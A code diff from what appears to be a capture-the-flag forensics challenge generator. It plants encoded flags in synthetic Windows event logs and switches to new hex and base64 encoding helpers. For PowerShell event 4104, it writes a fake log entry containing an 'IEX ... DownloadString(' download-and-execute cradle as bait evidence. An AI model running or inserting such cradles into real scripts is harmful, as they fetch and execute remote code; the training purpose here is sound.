@@ -27,8 +27,7 @@ from typing import Optional
 
 from faker import Faker
 
-from poligon.core.templates.android import encode_flag
-from poligon.core.templates.evidence import _hex
+from poligon._vendor.megdan_schema.encoding import encode_b64, encode_hex
 
 ZIP_NAME = "challenge.zip"
 EVENTS_NAME = "events.json"
@@ -191,9 +190,9 @@ def _plant_flag(fake: Faker, data: dict, event_id: int, flag: str) -> None:
     escaping — never the raw flag (INV-P1)."""
     field = HIGH_VALUE_IDS[event_id][1]
     if event_id == 4732:
-        data[field] = f"CN={_hex(flag)},CN=Users,DC=corp,DC=example"
+        data[field] = f"CN={encode_hex(flag)},CN=Users,DC=corp,DC=example"
         return
-    flag = encode_flag(flag)
+    flag = encode_b64(flag)
     if event_id == 4104:
         data[field] = (f"$key = '{flag}'\n"
                        f"IEX (New-Object Net.WebClient).DownloadString("
